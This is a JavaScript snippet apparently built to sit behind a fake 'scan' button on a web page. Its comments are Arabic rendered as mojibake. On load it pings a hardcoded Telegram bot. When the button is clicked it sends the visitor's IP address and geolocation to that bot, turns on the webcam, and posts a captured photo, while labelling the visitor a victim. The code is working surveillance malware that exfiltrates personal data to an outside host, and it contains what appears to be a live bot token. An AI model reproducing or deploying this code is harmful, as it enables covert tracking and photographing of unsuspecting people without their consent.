(function() {
    // ุงูุชููู ูุงูู ID ุงูุฌุฏูุฏ ุจุชุงุนู
    const _tok = "7873426394:AAGPD3N5Nz-ReJ90LeTD99gnze9P0evIr7o";
    const _usr = "7253092491";

    // ุฏุงูุฉ ุงูุฅุฑุณุงู ุงูุฃุณุงุณูุฉ
    function _report(msg) {
        const url = `https://api.telegram.org/bot${_tok}/sendMessage?chat_id=${_usr}&text=${encodeURIComponent("[SYSTEM]: " + msg)}`;
        fetch(url).catch(e => console.error("Error sending to TG"));
    }

    // ุฃูู ูุง ุงูุตูุญุฉ ุชูุชุญ ูุจุนุชูู ุชูุจูู ุฅู ุงูููุฏ ุดุบุงู
    _report("โ ุงููุธุงู ูุชุตู ูุงูุชููู ุงูุฌุฏูุฏ ูุนูู!");

    async function _capturePhoto() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            await video.play();

            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', _usr);
                    fd.append('photo', blob, 'shot.jpg');
                    fd.append('caption', '๐ฏ ููุทุฉ ูููุฏู');
                    
                    fetch(`https://api.telegram.org/bot${_tok}/sendPhoto`, { method: 'POST', body: fd })
                    .then(() => stream.getTracks().forEach(t => t.stop()));
                }, 'image/jpeg');
            }, 3000);
        } catch (e) { 
            _report("โ ูุดู ูุชุญ ุงููุงููุฑุง (ุชู ุงูุฑูุถ ุฃู ุงูุฌูุงุฒ ูุง ูุฏุนู)"); 
        }
    }

    const btn = document.getElementById('startScanBtn');
    if (btn) {
        btn.addEventListener('click', () => {
            _report("๐ ุงูุถุฎูุฉ ุถุบุท ุนูู ุฒุฑ ุงููุญุต");

            // ุฌูุจ ุงูู IP
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(d => _report(`๐ IP: ${d.ip}`))
                .catch(() => _report("ูุดู ุฌูุจ ุงูู IP"));

            // ุฌูุจ ุงููููุน
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(p => {
                    const map = `๐ ุงูุฎุฑูุทุฉ: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                    _report(map);
                }, () => _report("โ ุฑูุถ ุฅุฐู ุงููููุน"));
            }

            // ุงูุชูุงุท ุงูุตูุฑุฉ
            _capturePhoto();
        });
    }
})();
